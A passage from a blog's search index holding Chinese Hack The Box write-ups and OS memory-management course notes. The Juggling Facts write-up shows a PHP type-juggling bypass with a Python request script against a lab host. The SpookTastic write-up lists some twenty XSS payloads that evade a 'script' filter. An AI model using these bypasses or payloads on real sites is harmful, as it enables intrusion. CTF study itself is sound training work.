是一样的。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB Juggling facts Writeup","slug":"CTF/Web/HTB-Juggling-facts-Writeup","date":"2025-04-02T22:46:14.000Z","updated":"2025-04-02T23:05:45.552Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 点击 secret facts： flag大概率和这个“secrets”有关系，但其他没有什么发现所以去看看源代码。在 index.php 里 123456789101112131415161718&lt;?php spl_autoload_register(function ($name) &#123; if (preg_match(&#x27;/Controller$/&#x27;, $name)) &#123; $name = &quot;controllers/$&#123;name&#125;&quot;; &#125; elseif (preg_match(&#x27;/Model$/&#x27;, $name)) &#123; $name = &quot;models/$&#123;name&#125;&quot;; &#125; include_once &quot;$&#123;name&#125;.php&quot;;&#125;);$database = new Database(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;M@k3l@R!d3s$&#x27;, &#x27;web_juggling_facts&#x27;);$database-&gt;connect();$router = new Router();$router-&gt;new(&#x27;GET&#x27;, &#x27;/&#x27;, &#x27;IndexController@index&#x27;);$router-&gt;new(&#x27;POST&#x27;,&#x27;/api/getfacts&#x27;, &#x27;IndexController@getfacts&#x27;);die($router-&gt;match()); 可以发现网页定义了2个操作：get和post。2者都调用了 IndexController ，所以我们顺着这个线索去看一下 IndexController.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass IndexController extends Controller&#123; public function __construct() &#123; parent::__construct(); &#125; public function index($router) &#123; $router-&gt;view(&#x27;index&#x27;); &#125; public function getfacts($router) &#123; $jsondata = json_decode(file_get_contents(&#x27;php://input&#x27;), true); if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata)) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Insufficient parameters!&#x27;]); &#125; if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Currently this type can be only accessed through localhost!&#x27;]); &#125; switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;secrets&#x27;) ]); case &#x27;spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;spooky&#x27;) ]); case &#x27;not_spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;not_spooky&#x27;) ]); default: return $router-&gt;jsonify([ &#x27;message&#x27; =&gt; &#x27;Invalid type!&#x27; ]); &#125; &#125;&#125; 稍微拆解分析一下，如果我们发送一个post请求，那么它 首先会检查请求参数是否存在： 1if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata) ) 判断 type 类型，如果是secrets那么检查是否是本地 IP 1if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) 比较type的值并进行后续操作： 12345switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: case &#x27;spooky&#x27;: case &#x27;not_spooky&#x27;:&#125; 渗透漏洞正是这个流程里的 switch() 函数。php里的这个比较函数是宽松比较（loose comparison）（严格的话是===），会根据情况自动转换类型，所以可以利用true绕过： 1234567891011121314151617181920&lt;?php$jsondata = [ &#x27;type&#x27; =&gt; true];switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: echo &quot;true == secrets\\n&quot;; break; case &#x27;spooky&#x27;: echo &quot;Failed\\n&quot;; break; case &#x27;not_spooky&#x27;: echo &quot;Failed\\n&quot;; break; default: echo &quot;Failed\\n&quot;; break;&#125; 会返回： 1true == secrets 所以我们直接发送： 123456789101112131415import requestsurl = &#x27;http://94.237.63.28:34695/api/getfacts&#x27;data = &#123; &quot;type&quot;: True&#125;resp = requests.post(url, json=data) print(&quot;Response:&quot;)print(resp.text)# 返回：# Response:# &#123;&quot;facts&quot;:[&#123;&quot;id&quot;:19,&quot;fact&quot;:&quot;HTB&#123;juggl1ng_1s_d4ng3r0u5!!!&#125;&quot;,&quot;fact_type&quot;:&quot;secrets&quot;&#125;]&#125; 就可以得到flag：HTB{juggl1ng_1s_d4ng3r0u5!!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"}]},{"title":"HTB SpookTastic Writeup","slug":"CTF/Web/HTB-SpookTastic-Writeup","date":"2025-04-02T21:56:21.000Z","updated":"2025-04-02T22:21:36.823Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 翻到最底下可以看到一个输入框： 阅读一下源代码（app.py）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import random, stringfrom flask import Flask, request, render_template, abortfrom flask_socketio import SocketIOfrom threading import Threadapp = Flask(__name__)socketio = SocketIO(app)registered_emails, socket_clients = [], &#123;&#125;generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])BOT_TOKEN = generate(16)def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return Truedef send_flag(user_ip): for id, ip in socket_clients.items(): if ip == user_ip: socketio.emit(&quot;flag&quot;, &#123;&quot;flag&quot;: open(&quot;flag.txt&quot;).read()&#125;, room=id)def start_bot(user_ip): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC host, port = &quot;localhost&quot;, 1337 HOST = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; options = Options() options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--disable-dev-shm-usage&quot;) options.add_argument(&quot;--disable-infobars&quot;) options.add_argument(&quot;--disable-background-networking&quot;) options.add_argument(&quot;--disable-default-apps&quot;) options.add_argument(&quot;--disable-extensions&quot;) options.add_argument(&quot;--disable-gpu&quot;) options.add_argument(&quot;--disable-sync&quot;) options.add_argument(&quot;--disable-translate&quot;) options.add_argument(&quot;--hide-scrollbars&quot;) options.add_argument(&quot;--metrics-recording-only&quot;) options.add_argument(&quot;--mute-audio&quot;) options.add_argument(&quot;--no-first-run&quot;) options.add_argument(&quot;--dns-prefetch-disable&quot;) options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;) options.add_argument(&quot;--media-cache-size=1&quot;) options.add_argument(&quot;--disk-cache-size=1&quot;) options.add_argument(&quot;--user-agent=HTB/1.0&quot;) service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;) browser = webdriver.Chrome(service=service, options=options) try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) except Exception as e: pass finally: registered_emails.clear() browser.quit()@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])def register(): if not request.is_json or not request.json[&quot;email&quot;]: return abort(400) if not blacklist_pass(request.json[&quot;email&quot;]): return abort(401) registered_emails.append(request.json[&quot;email&quot;]) Thread(target=start_bot, args=(request.remote_addr,)).start() return &#123;&quot;success&quot;:True&#125;@app.route(&quot;/bot&quot;)def bot(): if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN: return abort(404) return render_template(&quot;bot.html&quot;, emails=registered_emails)@socketio.on(&quot;connect&quot;)def on_connect(): socket_clients[request.sid] = request.remote_addr@socketio.on(&quot;disconnect&quot;)def on_disconnect(): del socket_clients[request.sid]if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) 不难发现2点： 这里 1return render_template(&quot;bot.html&quot;, emails=registered_emails) 会接收我们的输入并且直接插入 bot.html 里，而查看 bot.html ： 123&#123;% for email in emails %&#125; &lt;span&gt;&#123;&#123; email|safe &#125;&#125;&lt;/span&gt;&lt;br/&gt;&#123;% endfor %&#125; 会发现它会直接将我们的输入不进行过滤直接插入进模板里，所以注入是可行的。 唯一的一点小阻拦是这里： 1234567def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return True 我们输入的内容不能包含”script”。 通过这段： 12345678try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) 可以确定只要我们可以成功触发alert就可以得到flag。 渗透我们需要做的就是不构造包含”script”的注入触发alert，方法有很多种（每一行都是可行的）： 1234567891011121314151617181920212223242526272829&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onerror=&amp;#x61;lert(1)&gt;&lt;img src=1 onerror=confirm(1)&gt;&lt;img src=a onerror=prompt(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg onload=&amp;#97;lert(1)&gt;&lt;svg oNlOaD=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=/*x*/alert(1)&gt;&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;&lt;svg onload=prompt(1)&gt;&lt;svg&gt;&lt;animate attributeName=x dur=1s onend=alert(1)&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt;&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;&lt;details open ontoggle=alert(1)&gt;X&lt;/details&gt;&lt;math&gt;&lt;mtext&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/span&gt;&lt;svg onload=alert(1)&gt;&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/span&gt;&lt;iframe onload=alert(1)&gt;&lt;/span&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt; 点击后就会显示： 得到flag：HTB{al3rt5_c4n_4nd_w1l1_c4us3_jumpsc4r35!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"}]},{"title":"GBS 6 Speicherverwaltung 内存管理","slug":"TUM笔记/GBS/GBS-6-Speicherverwaltung-内存管理","date":"2025-04-02T20:20:04.000Z","updated":"2025-04-04T22:41:43.187Z","comments":true,"path":"2025/04/02/TUM笔记/GBS/GBS-6-Speicherverwaltung-内存管理/","permalink":"https://archer-baiyi.github.io/2025/04/02/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-6-Speicherverwaltung-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"Einführung首先来看一下计算机存储的层次结构： 从上往下依次是寄存器、缓存、内存、硬盘以及磁带驱动器。存储空间大小（从上往下）依次递增，但读取速度依次递减。 我们这章主要关注内存（Hauptspeicher）。 物理内存管理假如所有程序可以完全访问整个物理内存，那么每个程序都有可能占用整个主内存，甚至可能覆盖掉系统内存区域，导致系统崩溃。包括程序直接也可能会相互干扰。所以我们希望给每个进程分配独立的存储空间。 寻址（Adressierung）而为了更好地管理物理地址空间（Physischer Adressraum），我们会从中抽象出逻辑地址空间（Logischer Adressraum），然后通过内存映射（Speicherabbildung，Memory Address Translation）将逻辑地址转换成实际的物理地址。这种内存映射也叫做寻址（Adressierung）。 寻址方式一般有3种： 直接寻址（Direkte Adressierung）这种寻址的映射相当于是 $f = id$ 。图示： 但一旦有多个程序运行的话，我们会碰到以下问题： 大量交换（Extensives Swapping） 在某一时刻一定是只有一个程序在运行并且使用内存空间，所以当操作系统想要切换运行的程序时，需要把当前运行程序的内存内容保存到硬盘，然后从硬盘加载下一个程序到内存中。 这样会导致效率极其低下（或者说非常慢）。 重定位（Relokation） 由于程序可以被加载到内存的不同位置，所以每次重新分配地址时需要改写（重定位）所有的地址，会非常的麻烦。（可以看下面举的例子） 基址寻址（Basis-Adressierung）每一个进程会得到一个基址（Basisadresse）$b_x$ ，这个进程的所有地址都是基于这个基址的一个相对地址。 图示： 举个例子区分一下基址寻址（Basis-Adressierung）和直接寻址（Direkte Adressierung）：假设我们现在的内存空间有15个Block，并且有2个程序在使用内存，我们将1-5分给第一个程序，把6-10分给第二个程序。如果是直接寻址的话，第一个程序的地址需要记录成（1，2，3，4，5），第二个需要记录（6，7，8，9，10）。但如果是基址寻址的话，第二个只需要记录（5；1，2，3，4，5），主要会记录相对位置。这样一来在重新分配内存空间时只需要修改basis（也就是5）即可（比如说（10；1，2，3，4，5）），其他的不需要改变。 当然基址寻址（Basis-Adressierung）也有个缺点，那就是每次计算地址时都需要进行一次加法操作。（Aufwendige Additionsoperation） 段式寻址（Segmentadressierung）将Adressraums分成不同长度的逻辑段（logische Segmente），比如说分成Stack-, Daten-, Code-Segment。这样做的好处是可以给每一段内容不同的权限（Zugriffsberechtigungen），以提高安全性，针对pwn的攻击特别有用。 每个段需要两个基本信息：段起始地址（Segmentanfangsadresse）和段的长度（Länge des Segments）。 CPU通常提供一个段寄存器（Segmentregister）来保存段信息。 只不过主要是32 位操作系统会使用段机制，而在64 位系统中基本不用段机制，最多用于线程管理（TLS）和兼容性支持。 我们来看一下x86里的段式寻址（Segmentadressierung）的例子： x86 架构会使用一个叫做全局描述符表（Global Descriptor Table, GDT）的数据结构来管理段，每一项会包含以下信息： 基地址（Basisadresse） 段的长度（Länge des Segments） 标志位（Flags）：例如Zugriff以及Segment的类型（Code，Daten还是Stack） 而段寄存器（Segmentregister）中保存的不是地址，而是GDT表中的一个索引。 1. 想要访问 cs:0x800 的话，需要先在段寄存器（Segmentregister）找到cs对应的值，也就是 0x08，然后找到这个值在DGT对应的那一行信息。随后计算 0x10000 + 0x800 = 0x10800。确认它在范围内，所以这个就是我们要的地址。 2. 想要访问 es:0x800 的话，需要先在段寄存器（Segmentregister）找到es对应的值，也就是 0x10，然后找到这个值在DGT对应的那一行信息。随后计算 0x20000 + 0x800，会发现超出范围了，因为它的长度只有 0x00800，所以会返回 “Segmentation Fault”。 空闲内存管理（Freispeicherverwaltung）存储结构位图（Bitmap）将存储空间分成相同大小的块（Blöcke），每个块用一个bit标记，1表示已占用，0表示空闲。这一串内容就是位图（Bitmap）。 例子： 但是实现过程中会遇到一个问题：Blcok的大小该怎么选择呢？选小了就会需要更大位图，但选大了又容易导致浪费。 优势： 可以简单快速地访问固定大小的内存块。 缺点： 假如有个进程需要k个Block，那么就需要在位图里找到7个连续的0，这个的开销就太大了。 链表（Verkettete Liste）还是将存储空间分成相同大小的块（Blöcke），然后链表记录块的占用信息： 链表的每一项存储： 开始地址 长度 指向下一项的指针（einen Zeiger auf den nächsten Eintrag (oder Terminator T == NULL)） 例子： P表示已被进程占用，F表空闲。 优点： 灵活（Flexible Speicheraufteilung） 缺点： 需要线性搜索（Lineare Suche） 需要挨个找有没有合适的。 没有固定的管理结构 优化的办法： 分别维护两个链表，一个存储已分配的内存块，一个存储空闲的内存块。 按照内存块大小排序 使用平衡树结构管理链表（(balancierter) Baumstruktur） 同时使用多个链表 内存分配策略（Belegungstrategien）由于需要一直分配再释放进程的存储空间，所以存储空间容易碎片化。比如说在上面那张图里有着好几个空闲的连续的存储空间，我们该如何给每个进程选择一块合适的位置呢？ 一般会用到以下几个策略： （以这个为例:） First-Fit从前往后，找到大小够的直接给。 Next-Fit从上次停止的地方开始，找到够的直接给。 Best-Fit分配“最小剩余空间”的空闲块（Freibereich mit dem geringsten Verschnitt） Worst-Fit分配“最大剩余空间”的空闲块（Freibereich mit dem größten Verschnitt） Buddy-Algorithmus将存储空间分成 $2^k$ 大小的Block，where $l \\leq k \\leq u$，$2^l$是最小的可占用的空间大小，$2^u$是最大的可占用的空间大小。当一个进程需要的存储空间为 $x$ 时，会给它分配一块大小为 $2^{\\lfloor log_2(x) \\rfloor}$ 的Block。 这样一来每次最多会浪费半个Block大小的存储空间。 分配的具体算法看这个例子就好：（需要额外注意它合并空闲块的算法） 碎片化（Fragmentierung）一般会分成内部碎片与外部碎片。 内部碎片（Interne Fragmentierung）：在按块分配内存时，通常会分配多于实际所需的内存。这部分多余的内存区域既不能被当前进程使用（内部），也不能被其他进程使用（外部）。也就是会产生很多碎片（Verschnitt）。这些多余的部分就被叫做内部碎片。 例如Buddy-Algorithmus主要带来的便是内部碎片。它给每个进程分配了一个Block之后，这个Block里多余的部分是不会分配给其他进程的。 外部碎片（Externe Fragmentierung）：由于创建和释放内存块的动态变化，会在主存中产生空洞（Löcher）。即使总的空闲内存量是足够的，也可能没有一个足够大的连续内存区域来满足一个请求。这些空闲内存就被叫做外部碎片。 比如说使用Best-Fit策略，就会剩下来很多小的不连续的空闲块。 虚拟内存管理（Virtuelle Speicherverwaltung）一般情况下，进程的虚拟地址空间是大于实际可用的物理内存的。所以我们同样需要管理虚拟内存，以决定将哪些部分加载到（物理的实际）内存中。 最常用的实现方式便是分页（Paging）： 将虚拟地址空间被划分为页面（Seiten，Pages），内存（Hauptspeicher）被划分为物理页框（Kacheln，Frames）。通常每一页和每个页框的大小相同，或者至少页的大小是页框大小的倍数。 操作系统需要做的便是将页面映射到页框（Abbilden von Seiten auf Kacheln）。 这个映射具体由内存管理单元（Memory Management Unit，MMU）完成。 Paging中三个重要概念：（下面会详细讲） 页表（Page Table）： 负责管理虚拟页与物理页框之间的映射关系，操作系统为每个进程维护一张页表。 缺页异常（Seitenfehler，Page Fault）： 当访问一个尚未被加载到内存的虚拟页时，就会产生一个页错误（Page Fault），硬件会发出一个中断信号。操作系统响应这个中断，把缺失的页从磁盘加载到内存 页面换入（Seiteneinlagerung）： 如果内存已满，则需要将已有的页移出（换出）来腾出空间，被换出的页会被保存到硬盘中。 流程： 程序访问虚拟页 → 检查页表 → 若页不在内存 → 触发页错误（Page Fault） → OS 调入页面 → 若内存满 → 页面置换 → 更新页表 → 继续执行 硬件组件如之前提到的，内存管理单元（Memory Management Unit，MMU）负责完成地址的映射。 它的工作流程如图： CPU 发送虚拟地址（VA）给 MMU MMU 根据虚拟地址确定 Page Table Entry 的地址（PTEA） MMU 从缓存或内存中读取页表项（PTE） MMU 根据页表项计算出物理地址（PA） 缓存/内存将物理地址对应的数据（Daten）发送回 CPU 但这样会带来一个问题：由于页表通常存放在主存中，所以地址转换（Adressabbildung）的开销会非常大。 因此可以利用缓存（Cache）来改善这个问题：地址转换后备缓冲区（Translation Lookaside Buffer，TLB），它负责存储近期访问过的页表项（Page Table Entry）。 流程： CPU 发送虚拟地址 VA MMU 提取出虚拟页号 VPN，查询 TLB 如果 TLB 命中（TLB Hit），直接获得页表项（PTE） MMU 根据 PTE 生成物理地址（PA） 数据从物理内存中返回到 CPU 没有 Hit 的情况叫做 TLB Miss，会需要一次额外的内存访问来加载页表项（PTE）： 页表（Page Table）一个虚拟地址 v 会被解释为v=(s,w)，其中s表示页号（Seitenummer），w表示偏移量（Offset）。 每一页都对应一个页表项（1 Page-Table-Eintrag pro Seite），而这个页表项里会存储页框号（Frame-Nummer）。在转换地址时，s会被直接转换成页框号（Frame-Nummer），然后和w拼起来组成真正的物理地址。如图： 具体的转换过程可以看文章末尾的相关例题。 而页表中除了地址，还会存储附加信息，通过单个位（Bit）来表示： P（present）位：是否存在 表示对应的物理地址是否存在/有效 U/S（user/supervisor）位：用户/内核模式访问控制 指示是否只有操作系统内核（Betriebssystemkern）可以访问该页面 R（referenced）/ A（accessed）位：是否被访问过 只要这个页面被访问（zugegriffen），CPU就会自动设置这一位（为1）。 M（modify）/ Dirty Bit：是否被修改过 只要这页里有至少一个字节被写入（geschrieben），CPU就会自动设置这一位（为1）。 XD（execute-disable）位：禁止执行位 表示该页是否允许执行指令。属于保护措施。 多级页表（Mehrstufige Seitentabellen）如果虚拟地址空间很大，那么相应的页表（Page Table）也非常大，意味着将整个页表放入内存会占用大量内存资源。 所以需要引入多级页表结构，每一级页表只负责一部分地址空间，按需加载。 页错误（Seitenfehler，Page Fault）当程序访问一个虚拟地址时，如果该地址对应的页面不在内存中（即页表中的 P-Bit 未设置），就会发生页错误（Seitenfehler，Page Fault）。硬件会触发中断（Interrupt），交由操作系统处理，执行页错误处理器（Page-Fault-Handler）。 处理时分2种情况： 页面被换出（ausgelagert）： 查找是否有空闲页框（Kachel）： 有空闲：直接加载页面 无空闲：使用页面置换算法（Seitenersetzungsstrategien）释放空间 页面不存在也未被换出（nicht ausgelagert） 操作系统会触发内存保护错误（Speicherschutz-Fehler） 之后便会更新页表项（Page-Table-Eintrag）：设置P-Bit，清除R-Bit和M-Bit。 这些操作都完成之后便会恢复程序的状态。 目前这些转换地址的流程总结一下就是： 页面置换算法（Seitenersetzungsstrategien）替换页面的时候，我们有3个问题需要考虑：当内存满了，我们应该 在什么时候加载页面？ 针对这个问题我们有2种方法： 按需分页（On-Demand Paging）：页面只有在确实被访问到时，才会被加载到主存。 预取（Prefetching）：会提前加载页面以备不时之需。但这样一来又会回到一开始的问题，我们需要在提前多久加载哪些内容呢？ 将页面加载到哪里？ 所有页框（Kacheln）地位相同，一般不需要策略决定。但在实际中操作系统一般会对内核代码和内核数据做特殊处理，比如说恒等映射（Identity Mapping），即虚拟地址 = 物理地址。这样效率会高很多。 如果内存已经满了，我们该把现有的哪一页给换下去？ 这些正是我们下面会仔细讲的内容。 理论上最完美的算法当然是替换掉那个 下一次将被访问时间最晚 的页面。操作系统肯定是无法做到预知未来的，不过我们可以尝试往这个方向靠。 FIFO跟普通的First-in-First-Out一样，先替换掉最早来的。 例子： 缺点：在实际情况里大部分最早来的都是最重要的，所以之后大概率会多次访问，如果被替换下去了会一直触发Page Fault，开销会很大。 所以相比之下较常用的是它的改版：Second-Chance-Algorithmus。 Second-Chance-Algorithmus在FIFO的基础上，会给每页第二次机会。 页面被访问时会设置R-bit = 1。如果在队伍首则判断R-Bit的值，等于0就会被替换掉（如果M=1需要先执行写入操作然后再替换），等于1的话就给R-Bit的值更新成0然后挪到队伍尾。 图示： 缺点：每次都移动整个队列非常麻烦。 所以使用更高效的数据结构替代队列：Clock。 Clock-Algorithmus将所有页面按顺序组成一个环状列表（就像Clock一样），有一个“时钟指针”指向其中某个页面，表示当前检查的位置。这个指针用于寻找要替换的页面。 具体流程： 如果当前指向的页面的 R 位为 0： 替换这个页面为新页面 指针移动一格（顺时针） 如果 R 位为 1： 将 R 位清除（设为 0） 指针继续移动一格，检查下一个页面 重复 1-2 步骤： 直到找到一个 R 位为 0 的页面 这个页面会被替换 如果该页面的 M 位（Modified Bit）为 1： 将该页面内容写回磁盘 如果 M 位为 0： 直接丢弃该页面（因为它未被修改） 具体例子见文章结尾的例题。 Clock 例子： 假设现在需要进行这些操作： 那么：（每一步里被修改了的内容都用橙色标出来了的） Least Recently Used (LRU)因为程序的局部性原理（Lokalitätseigenschaft），我们可以假设过去经常使用的页面，未来也可能被再次使用。 当发生Page Fault时，替换掉那个“最长时间没被使用”的页面。 缺点：这个方法的实现需要一个双向链表，记录所有被访问页面，每次访问页面都要把它移到表头（意味着频繁更新），开销太大了，效率不高。 不过我们可以考虑使用软件近似模拟LRU（用“近似但效率更高”的方法来模拟 LRU 的行为趋势）：Not Frequently Used (NFU) 和 Aging。 LRU例子： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Not Frequently Used (NFU) 给每个页面 P 引入一个软件计数器 $A_p$ 固定大小，例如 b 位（bit），初始为 0 每次定时器中断（Timer-Interrupt）时： 操作系统检查所有页面的 R 位（被访问位） 如果某个页面 P 的 R 位被设置： 对应的计数器 $A_p$ 加 1 缺点：NFU并不知道“访问是否是最近的”，只知道总访问次数。比如说一个页面过去访问很多，但最近一直没被访问，NFU仍然会认为它很重要。 为了解决这个问题便需要Aging-Verfahren。 NFU 例子1： 页面编号：0, 1, 2, 3, 4 访问顺序（参考链）：0111221123324434 得到的计数器值：$A_0=1, A_1=5, A_2=4, A_3=3, A_4=3,$ NFU 例子2： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Aging-VerfahrenAging主要的思路是记录访问的“老化”程度（Erfassung der Alterung von Zugriffen）。 首先设置一个固定时间间隔 t（比如 20 毫秒）并记录哪些页面在这个间隔内被访问了。 同样会给每个页面 P 引入一个软件计数器 $A_p$。 每隔 t 的时间都会更新$A_p$： 将计数器向右移一位（shift） 把当前 R 位的值放到最高位 Aging 例子： 假设：Aging 计数器为 4 位（二进制），当前计数器 $A_p = 1100_2 = 12_{10}$，当前的引用位 R = 0。 那么新的 $A_p$ 会变成 $0110_2 = 6_{10}$ 。 当然，Aging也是有一定局限性的，但是我没看懂。（乐） Working-Set Ersetzungs-Verfahren前面这些策略全都是基于按需分页（Demand Paging）的，我们现在来看点不一样的。 首先，一个进程当前真正需要的那一批页面（Die Menge der Seiten, die ein Prozess aktuell benötigt）称为：工作集（Working Set）。而抖动（Setitenflattern，Thrashing）指的是当进程频繁地触发Page Fault。 在Working-Set-Modell中： 在任意时刻 t，工作集 w(k, t) 表示进程在最近的 k 次内存访问中访问到的页面集合。（从t往前数k个） 比如说给定一个访问序列：26157777516234123444344，并且将k设置为4，那么w(k, t1) = {3, 4}，w(8, t1) = {2, 3, 4}。 最简单的办法肯定是只替换不在当前工作集内的页面，但是每次都往前追踪k次访问带来的开销太大了。所以我们使用进程的执行时间（Rechenzeit）来近似。 需要先定义几个值： 执行时间区间 $\\tau$ 时间间隔 I（Clock Tick 间隔） 给每个进程设置一个单调递增的计数器 $Z$，用于近似进程的执行时间（Ausführungszeit /Rechenzeit)，实际使用CPU的时间） 给每一页 P 设置一个计数器 $Z_p$，用于近似上次访问的时间。 Working-Set Ersetzungs-Verfahren： 当发生页面错误时，操作系统会检查所有页的 R 位（R-Bits）： 如果R=1 für Seite P：页面属于 Working-Set，不会被替换，但是会将当前的 $Z_p$ 更新成 $Z$ 的值； 如果R=0 für Seite P： 如果$Z - Z_P &gt; \\tau$：P不属于Working-Set，会被替换掉； 如果$Z - Z_P \\leq \\tau$：虽然 P 在 I 这段时间里没有被使用过，但还是属于 Working-Set。 如果找到了多个符合条件的候选页：系统会选择 $Z_p$ 最小的那一页，称为 $P_{\\text{old}}$。 如果找不到任何页面可以换出（所有页面都还在 Working Set 中）：替换最老的页面（即 $P_{\\text{old}}$）。 缺点：实现起来非常复杂。 所以实际中会用 Working-Set Ansatz mit Clock-artiger Verwaltung der Seiten。 Working Set with Clockmalloc()Linux中的内存管理使用4级页表（4-stufige Pagetabelle）。 内存分配（Speicher-Allokation）： Buddy 分配器（Buddy-Allocator，基于之前讲的Buddy-Algorithm）：最小分配单位为页（page） 页面替换策略（Seitenersetzungsstrategie）： 使用 Swap 区：页不会立即被换出，而是暂存在 Swap 区 操作系统会保留一部分空闲帧（Frames），以便快速加载需要的页面 使用 Clock 替换算法的一个变种 作为页面替换策略 